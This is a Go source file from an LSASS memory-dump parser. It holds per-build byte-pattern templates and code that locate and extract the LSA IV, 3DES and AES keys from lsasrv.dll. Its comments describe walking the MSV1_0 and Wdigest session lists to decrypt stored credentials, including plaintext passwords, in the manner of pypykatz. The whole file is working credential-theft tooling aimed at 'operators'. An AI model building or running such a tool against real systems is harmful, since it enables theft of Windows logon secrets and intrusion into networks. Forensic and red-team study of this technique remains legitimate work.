package lsasparse

import (
	"encoding/binary"
	"fmt"
	"sync"
)

// Templates are the per-build offset tables that locate LSA crypto
// globals + MSV1_0 struct layouts inside lsasrv.dll / msv1_0.dll.
//
// pypykatz uses a similar mechanism (`pypykatz/lsadecryptor/lsa_template_x64.py`).
// The values here are facts about the compiled Microsoft binaries —
// derived independently per template by walking the disassembly until
// the IV / key load instructions are reached and recording the
// surrounding byte sequence + offset.
//
// Templates ship for known builds. Operators on a build we don't
// cover register their own via RegisterTemplate at runtime — no
// recompile, no fork.

// Template captures every per-build offset the parser needs for one
// `(architecture, ntoskrnl-build)` tuple. Architecture is implicit
// in the registry (only x64 today).
type Template struct {
	// BuildMin / BuildMax — inclusive ntoskrnl build range. The
	// parser picks the FIRST template whose range covers
	// SystemInfo.BuildNumber.
	BuildMin uint32
	BuildMax uint32

	// IVPattern is a wildcard byte pattern inside lsasrv.dll's .text
	// section. Any byte in IVPattern matching 0x00 may also match
	// the position listed in IVWildcards — handles per-CU drift.
	IVPattern   []byte
	IVWildcards []int // sorted byte indices that are "any byte" matches
	// IVOffset is the signed byte distance from the start of the
	// IVPattern match to the IV's RVA-encoding instruction. Plus the
	// 4-byte rel32 displacement at IVOffset itself yields the IV
	// address inside lsasrv's .data segment.
	IVOffset int32

	// 3DES + AES key pattern + offset use the same RIP-relative
	// dereference scheme.
	Key3DESPattern   []byte
	Key3DESWildcards []int
	Key3DESOffset    int32

	KeyAESPattern   []byte
	KeyAESWildcards []int
	KeyAESOffset    int32

	// MSV1_0 LogonSessionList head pattern (used by phase 4).
	LogonSessionListPattern   []byte
	LogonSessionListWildcards []int
	LogonSessionListOffset    int32
	// LogonSessionListCount is the number of hash buckets — Win10
	// has 32, Win11 has 64. The walker enumerates each bucket head.
	LogonSessionListCount int

	// MSVLayout captures per-build _MSV1_0_LOGON_SESSION node offsets.
	// See MSVLayout type doc for the field-by-field meaning.
	MSVLayout MSVLayout

	// Wdigest fields. The Wdigest provider lives in wdigest.dll (not
	// lsasrv.dll), exposes a single doubly-linked list of session
	// nodes (no bucket array), and stores plaintext passwords
	// encrypted with the same LSA key chain. A template that doesn't
	// support Wdigest leaves these zero — the Wdigest walker is
	// skipped.
	WdigestListPattern   []byte
	WdigestListWildcards []int
	// WdigestListOffset is the signed byte distance from the
	// WdigestListPattern match to the rel32 that points at the list
	// head global inside wdigest.dll's .data segment.
	WdigestListOffset int32
	// WdigestLayout captures per-build KIWI_WDIGEST_LIST_ENTRY node
	// offsets. Set NodeSize=0 to disable the Wdigest walker.
	WdigestLayout WdigestLayout
}

// validate sanity-checks a template before it enters the registry.
func (t *Template) validate() error {
	if t.BuildMin == 0 {
		return fmt.Errorf("template: BuildMin == 0")
	}
	if t.BuildMax < t.BuildMin {
		return fmt.Errorf("template: BuildMax %d < BuildMin %d", t.BuildMax, t.BuildMin)
	}
	if len(t.IVPattern) == 0 || len(t.Key3DESPattern) == 0 || len(t.KeyAESPattern) == 0 {
		return fmt.Errorf("template: IV / 3DES / AES pattern empty")
	}
	return nil
}

// templateRegistry stores every registered template. Linear scan on
// lookup — single-digit count typical, so an ordered slice is fine.
var (
	templateMu       sync.RWMutex
	templateRegistry []*Template
)

// RegisterTemplate adds t to the lookup registry, ordered by
// BuildMin ascending so callers' overrides win when their range is
// narrower than a built-in template's. Returns nil on success;
// validation errors abort registration without mutating the registry.
//
// Safe for concurrent use. Operators typically call once at init():
//
//	func init() {
//	    _ = lsasparse.RegisterTemplate(&lsasparse.Template{ BuildMin: 26100, BuildMax: 26100, … })
//	}
func RegisterTemplate(t *Template) error {
	if t == nil {
		return fmt.Errorf("template: nil")
	}
	if err := t.validate(); err != nil {
		return err
	}
	templateMu.Lock()
	defer templateMu.Unlock()
	// Insert sorted by BuildMin ascending; ties keep original order.
	insertAt := len(templateRegistry)
	for i, existing := range templateRegistry {
		if existing.BuildMin > t.BuildMin {
			insertAt = i
			break
		}
	}
	templateRegistry = append(templateRegistry, nil)
	copy(templateRegistry[insertAt+1:], templateRegistry[insertAt:])
	templateRegistry[insertAt] = t
	return nil
}

// templateFor returns the first registered template whose
// [BuildMin, BuildMax] covers build, or nil if none does.
func templateFor(build uint32) *Template {
	templateMu.RLock()
	defer templateMu.RUnlock()
	for _, t := range templateRegistry {
		if build >= t.BuildMin && build <= t.BuildMax {
			return t
		}
	}
	return nil
}

// resetTemplates clears the registry — test-only helper. Production
// code never empties templates.
func resetTemplates() {
	templateMu.Lock()
	defer templateMu.Unlock()
	templateRegistry = nil
}

// findPattern scans haystack for the first occurrence of pattern
// where every byte matches OR the index is in the wildcards set.
// Returns the byte offset of the match, or -1 if none.
//
// Wildcards must be sorted ascending — the linear search exploits
// that. Empty wildcards = exact match required.
func findPattern(haystack, pattern []byte, wildcards []int) int {
	if len(pattern) == 0 || len(haystack) < len(pattern) {
		return -1
	}
	wildSet := make(map[int]struct{}, len(wildcards))
	for _, w := range wildcards {
		wildSet[w] = struct{}{}
	}
	for i := 0; i <= len(haystack)-len(pattern); i++ {
		match := true
		for j := 0; j < len(pattern); j++ {
			if _, isWild := wildSet[j]; isWild {
				continue
			}
			if haystack[i+j] != pattern[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// extractLSAKeys runs the IV + 3DES + AES pattern scans inside the
// captured lsasrv.dll image and dereferences the rel32 offsets to
// recover the actual key bytes via ReadVA.
//
// Returns ErrKeyExtractFailed when any of the three patterns miss,
// or when the recovered BCRYPT_KEY_DATA_BLOB header fails validation.
func extractLSAKeys(r *reader, lsasrv Module, t *Template) (*lsaKey, error) {
	// Capture lsasrv.dll's full mapped image — pattern scan happens
	// over the entire mapped range. SizeOfImage is bounded by the
	// PE optional header (well under 16 MB for lsasrv.dll), no
	// memory blow-up risk.
	body, err := r.ReadVA(lsasrv.BaseOfImage, int(lsasrv.SizeOfImage))
	if err != nil {
		return nil, fmt.Errorf("%w: read lsasrv.dll body: %v", ErrKeyExtractFailed, err)
	}

	iv, err := derefRel32(body, lsasrv.BaseOfImage, t.IVPattern, t.IVWildcards, t.IVOffset, r)
	if err != nil {
		return nil, fmt.Errorf("IV: %w", err)
	}
	ivBytes, err := r.ReadVA(iv, 16)
	if err != nil {
		return nil, fmt.Errorf("%w: read IV bytes @0x%X: %v", ErrKeyExtractFailed, iv, err)
	}

	desVA, err := derefRel32(body, lsasrv.BaseOfImage, t.Key3DESPattern, t.Key3DESWildcards, t.Key3DESOffset, r)
	if err != nil {
		return nil, fmt.Errorf("3DES: %w", err)
	}
	// The chain is: rel32 → BCRYPT_KEY_HANDLE pointer → KDBM blob
	// pointer. lsasrv stores the handle's underlying blob 16 bytes
	// past the handle struct head. Read the 8-byte pointer to the
	// blob, then the blob itself.
	desBlobPtr, err := readPointer(r, desVA)
	if err != nil {
		return nil, fmt.Errorf("3DES handle: %w", err)
	}
	desBlob, err := r.ReadVA(desBlobPtr, bcryptKeyDataBlobHeaderSize+24)
	if err != nil {
		return nil, fmt.Errorf("%w: read 3DES blob: %v", ErrKeyExtractFailed, err)
	}
	desCipher, err := parseBCryptKeyDataBlob(desBlob)
	if err != nil {
		return nil, fmt.Errorf("3DES blob: %w", err)
	}

	aesVA, err := derefRel32(body, lsasrv.BaseOfImage, t.KeyAESPattern, t.KeyAESWildcards, t.KeyAESOffset, r)
	if err != nil {
		return nil, fmt.Errorf("AES: %w", err)
	}
	aesBlobPtr, err := readPointer(r, aesVA)
	if err != nil {
		return nil, fmt.Errorf("AES handle: %w", err)
	}
	aesBlob, err := r.ReadVA(aesBlobPtr, bcryptKeyDataBlobHeaderSize+16)
	if err != nil {
		return nil, fmt.Errorf("%w: read AES blob: %v", ErrKeyExtractFailed, err)
	}
	aesCipher, err := parseBCryptKeyDataBlob(aesBlob)
	if err != nil {
		return nil, fmt.Errorf("AES blob: %w", err)
	}

	return &lsaKey{
		IV:        ivBytes,
		AES:       aesCipher,
		TripleDES: desCipher,
	}, nil
}

// derefRel32 finds pattern in body, jumps to (matchStart + offset),
// reads a 4-byte little-endian rel32 displacement at that location,
// and returns the absolute VA the rel32 points at.
//
// The rel32 calculation matches x64 RIP-relative addressing:
//   target = (matchStart + offset + 4) + sign-extended(rel32)
// where the +4 accounts for the rel32 itself being part of the
// instruction the CPU computes RIP from.
func derefRel32(body []byte, baseVA uint64, pattern []byte, wildcards []int, offset int32, r *reader) (uint64, error) {
	matchAt := findPattern(body, pattern, wildcards)
	if matchAt < 0 {
		return 0, fmt.Errorf("%w: pattern not found", ErrKeyExtractFailed)
	}
	relAt := int64(matchAt) + int64(offset)
	if relAt < 0 || relAt+4 > int64(len(body)) {
		return 0, fmt.Errorf("%w: offset %d puts rel32 out of body bounds", ErrKeyExtractFailed, offset)
	}
	rel32 := int32(binary.LittleEndian.Uint32(body[relAt : relAt+4]))
	target := uint64(int64(baseVA) + relAt + 4 + int64(rel32))
	return target, nil
}

// readPointer reads an 8-byte little-endian uint64 from the dump at
// the given VA. Convenience wrapper used by the LSA key extraction
// chain when chasing through handle structs.
func readPointer(r *reader, va uint64) (uint64, error) {
	buf, err := r.ReadVA(va, 8)
	if err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint64(buf), nil
}
